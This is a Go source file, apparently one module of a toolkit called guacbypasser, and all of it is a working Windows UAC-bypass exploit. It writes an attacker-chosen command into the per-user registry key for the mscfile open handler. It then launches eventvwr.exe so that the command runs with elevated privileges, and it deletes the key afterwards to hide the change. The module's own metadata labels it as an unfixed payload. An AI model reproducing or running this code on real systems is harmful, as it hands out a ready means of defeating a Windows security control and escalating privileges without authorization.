package guacbypasser

import (
	"fmt"
	"os/exec"
	"path/filepath"
	"time"

	sc ".."
	"golang.org/x/sys/windows/registry"
)

func w32_nt_once_eventvwr(p string) (error, sc.Informer) {
	inf := sc.Informer{
		Name: "eventvwr",
		Desc: "Bypass UAC using eventvwr and registry key manipulation",
		Id:   2,

		Type:   "Once",
		Module: "w32_nt_once_eventvwr",

		Fixed:   false,
		FixedIn: "",

		Admin:   false,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath)

	// Create key in `Software\Classes\mscfile\shell\open\command`
	if _, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS); err != nil {

		return err, inf
	}

	// Open key in `Software\Classes\mscfile\shell\open\command`
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err, inf
	}

	// Setting DEFAULT key value for the ABSOLUTE program path
	if err := wk32.SetStringValue("", cmdN); err != nil {
		return err, inf
	}
	time.Sleep(time.Second)

	// Executing EventVWR.exe
	// Executing ABSOLUTE program name with high privileges
	cmd := exec.Command("eventvwr.exe")
	if err = cmd.Run(); err != nil {
		return err, inf
	}
	time.Sleep(3 * time.Second)

	if err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`); err != nil {
		return err, inf
	}
	return nil, inf
}

// NewOnceEventvwr #add-some-info-please
func NewOnceEventvwr(p string) (error, sc.Informer) { return w32_nt_once_eventvwr(p) }
